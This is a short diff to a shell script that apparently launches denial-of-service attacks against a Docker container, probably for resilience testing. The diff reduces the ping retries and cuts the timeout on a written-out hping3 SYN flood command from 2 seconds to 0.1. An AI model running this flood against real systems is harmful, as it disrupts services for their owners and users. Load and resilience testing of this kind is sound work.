@@ -16,12 +16,12 @@ PACKET_RATE="500"          # Packet rate per second for hping3 attack (adjust ac
 
 # Step 0: Check if target web service is reachable
 # Step 0: Check if target web service is reachable, with retries
-MAX_RETRIES=4
+MAX_RETRIES=1
 RETRY_COUNT=0
 echo "Using TARGET_IP=$TARGET_IP and TARGET_PORT=$TARGET_PORT"
 
 while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
-  ping -c 4 -W 5 $TARGET_IP &> /dev/null
+  ping -c 2 -w 2 $TARGET_IP &> /dev/null
   if [ $? -eq 0 ]; then
     echo "Target server is reachable. Proceeding with the attack..."
     break
@@ -42,7 +42,7 @@ echo "Starting Network Denial of Service attacks against Docker container at $TA
 
 # Step 1: SYN Flood Attack using hping3
 echo "[1/3] Performing SYN Flood Attack on Port $TARGET_PORT..."
-timeout 2 hping3 -S -p $TARGET_PORT --flood $TARGET_IP
+timeout 0.1 hping3 -S -p $TARGET_PORT --flood $TARGET_IP
 
 echo "Attacks completed."
 
